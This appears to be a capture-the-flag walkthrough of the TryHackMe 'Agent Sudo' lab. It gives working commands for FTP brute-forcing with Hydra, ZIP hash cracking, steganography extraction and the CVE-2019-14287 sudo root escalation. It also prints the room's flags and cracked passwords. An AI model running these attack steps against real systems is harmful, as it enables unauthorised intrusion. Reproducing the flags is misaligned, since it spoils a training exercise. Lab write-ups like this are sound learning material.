# Agent Sudo — TryHackMe Writeup

##  Overview

This room covers a full attack chain including:

- Web enumeration via HTTP headers
- Brute-force attacks
- Steganography
- Password cracking
- Privilege escalation via CVE

---

##  Initial Enumeration

Start by inspecting the web server:

```bash
curl http://10.129.162.195
````

### Response:

```html id="init01"
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

This indicates that the **User-Agent header** is important.

---

##  Port Scanning

```bash id="scan01"
nmap -sC -sV 10.129.162.195
```

### Open ports:

* **21/tcp** — FTP (vsftpd 3.0.3)
* **22/tcp** — SSH (OpenSSH 7.6p1)
* **80/tcp** — HTTP (Apache 2.4.29)

---

##  Web Exploitation (User-Agent Manipulation)

Intercept the request using Burp Suite and modify the `User-Agent`.

### Example:

``` http id="req01"
GET / HTTP/1.1
Host: 10.129.162.195
User-Agent: A
```

### Testing values:

* `A` → 200 OK
* `B` → 200 OK
* `C` → **302 Redirect**

### Response:

```http id="resp01"
HTTP/1.1 302 Found
Location: agent_C_attention.php
```

 This confirms a valid codename.

### Result:

* **Username:** `chris`

---

##  FTP Brute Force

Anonymous login failed, so brute-force is required:

```bash id="hydra01"
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.129.162.195
```

### Credentials:

* **Username:** chris
* **Password:** crystal

---

##  FTP Access

```bash id="ftp01"
ftp 10.129.162.195
```

### Files found:

* `To_agentJ.txt`
* `cute-alien.jpg`
* `cutie.png`

Download:

```bash id="ftpget01"
get To_agentJ.txt
get cute-alien.jpg
get cutie.png
```

---

##  Message Analysis

```bash id="msg01"
cat To_agentJ.txt
```

```text id="msg02"
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture.

From,
Agent C
```

 Key findings:

* Another user: **james**
* Password hidden inside an image

---

##  File Analysis

Inspect PNG:

```bash id="xxd01"
xxd cutie.png | tail
```

Output suggests embedded data:

```
To_agentR.txt
```

---

##  Extract Hidden Data

```bash id="binwalk01"
binwalk -e cutie.png
```

 Extracts a ZIP archive.

---

##  Crack ZIP Password

```bash id="zip01"
zip2john *.zip > hash.txt
john hash.txt
```

### Password:

```text id="zip02"
alien
```

Unzip:

```bash id="zip03"
unzip *.zip
```

---

##  Steganography

Extract hidden data from image:

```bash id="steg01"
steghide extract -sf cute-alien.jpg
```

### Password:

```text id="steg02"
Area51
```

 This reveals SSH credentials.

---

##  SSH Access

Credentials:

* **Username:** james
* **Password:** hackerrules!

```bash id="ssh01"
ssh james@10.129.162.195
```

---

##  User Flag

```bash id="userflag01"
cat user.txt
```

```text id="userflag02"
b03d975e8c92a7c04146cfa7a5a313c7
```

---

##  Image Context

The image references:

```text id="img01"
Roswell alien autopsy
```

---

##  Privilege Escalation

Check sudo permissions:

```bash id="sudo01"
sudo -l
```

A known vulnerability is present:

```text id="cve01"
CVE-2019-14287
```

---

##  Exploitation

Exploit sudo misconfiguration:

```bash id="root01"
sudo -u#-1 /bin/bash
```

 Root shell obtained.

---

##  Root Flag

```bash id="rootflag01"
cat /root/root.txt
```

```text id="rootflag02"
b53a02f55b57d4439e3341834d70c062
```

---

##  Bonus

**Agent R:**

```text id="bonus01"
DesKel
```

---

##  Conclusion

### Attack Path:

1. Nmap scan → identify services
2. Web enumeration → discover User-Agent hint
3. Header manipulation → find username `chris`
4. FTP brute-force → gain access
5. Download files → discover hidden clues
6. Extract ZIP from PNG
7. Crack ZIP password
8. Extract steganographic data
9. Gain SSH access (`james`)
10. Exploit CVE-2019-14287
11. Obtain root

---

##  Tools Used

* Nmap
* Burp Suite
* Hydra
* FTP
* Binwalk
* John the Ripper
* Steghide
* SSH

---

##  Key Vulnerabilities

* Trusting User-Agent header
* Weak credentials
* Hidden sensitive data in files
* Sudo misconfiguration (CVE-2019-14287)
